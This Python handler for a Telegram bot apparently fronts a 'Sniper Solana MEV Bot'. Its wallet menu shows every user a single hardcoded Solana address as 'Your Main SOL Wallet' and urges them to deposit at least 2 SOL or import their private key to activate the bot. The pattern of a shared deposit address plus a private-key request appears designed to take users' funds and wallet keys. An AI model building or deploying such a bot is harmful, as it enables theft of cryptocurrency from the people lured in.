from telebot import types
from sessions import user_sessions

def handle_wallet(bot, call):
    chat_id = call.message.chat.id

    # ✅ Ensure the user session exists
    if chat_id not in user_sessions:
        user_sessions[chat_id] = {}

    pubkey = user_sessions[chat_id].get("pubkey", "cbKTm2vT8xqcHZbGDjFo39T1tZjQag4ke7CGLEWd6jm")

    text = f"""
🚀 *Meet Sniper Solana MEV Bot* : Your 24/7 AI Trading Partner on Solana
Harness Next-Gen AI and MEV Strategies to Outpace the Market

🔑 *Your Main SOL Wallet*  
`{pubkey}` _(Tap to copy)_

💰 *Balance:* 0.0 SOL ($0.0)

🌐 [Website](https://snipermev.com/) | 📚 [Docs](https://snipermev.com/docs) | 📣 [Channel](https://t.me/SniperMEVOfficial)

💡 _Please keep at least 2 SOL into your wallet or import your private key to activate Sniper Solana MEV Bot_
"""

    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("👜 Import Wallet", callback_data="import_wallet"),
        types.InlineKeyboardButton("Export wallet", callback_data="export_wallet")
    )
    keyboard.add(
        types.InlineKeyboardButton("💸 Withdraw SOL", callback_data="withdraw_sol"),
        types.InlineKeyboardButton("❌ Close", callback_data="close_wallet_menu")
    )

    sent = bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=keyboard)

    # ✅ Save message ID safely
    user_sessions[chat_id]['wallet_msg_id'] = sent.message_id

def handle_close_wallet(bot, call):
    chat_id = call.message.chat.id
    msg_id = user_sessions.get(chat_id, {}).get("wallet_msg_id")

    if msg_id:
        try:
            bot.delete_message(chat_id, msg_id)
        except Exception as e:
            print(f"Could not delete wallet message: {e}")
